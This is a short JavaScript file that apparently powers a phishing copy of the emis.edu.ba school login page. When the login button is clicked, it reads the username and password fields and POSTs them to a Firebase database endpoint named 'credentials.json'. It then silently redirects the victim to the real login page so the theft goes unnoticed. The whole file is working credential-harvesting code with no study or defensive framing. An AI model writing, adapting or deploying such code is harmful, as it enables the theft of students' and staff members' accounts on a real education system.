
const userInputs = document.querySelectorAll("input");
const submitButton = document.getElementById("prijava");

const submitFormHandler = async (event) => {
    event.preventDefault();
    let username = userInputs[0].value;
    let password = userInputs[1].value;
    console.log("Submited");

    await fetch("https://emis-4500b-default-rtdb.europe-west1.firebasedatabase.app/credentials.json", {
        method: "POST",
        body: JSON.stringify({ username: username, password: password }),
        headers: { "Content-Type": "application/json" },
    });

    window.location.replace("https://emis.edu.ba/#/auth/prijava");
};

submitButton.addEventListener("click", submitFormHandler);
